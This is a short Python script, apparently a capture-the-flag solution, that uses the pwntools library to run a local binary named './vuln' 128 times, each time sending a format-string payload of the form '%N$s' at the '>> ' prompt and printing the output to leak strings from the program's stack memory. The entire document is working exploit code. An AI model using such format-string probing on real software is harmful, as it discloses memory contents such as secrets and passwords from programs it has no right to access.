import pwn

pwn.context.log_level = "critical"

programa = pwn.ELF("./vuln")

for i in range(0, 128):

    payload = b"".join([
        b"%" + str(i).encode("utf-8") + b"$s"
    ])

    pty = pwn.process.PTY
    p = programa.process(stdin=pty, stdout=pty)

    p.recvuntil(b">> ")
    p.sendline(payload)
    response = p.recvall().decode("latin-1")
    print(response)

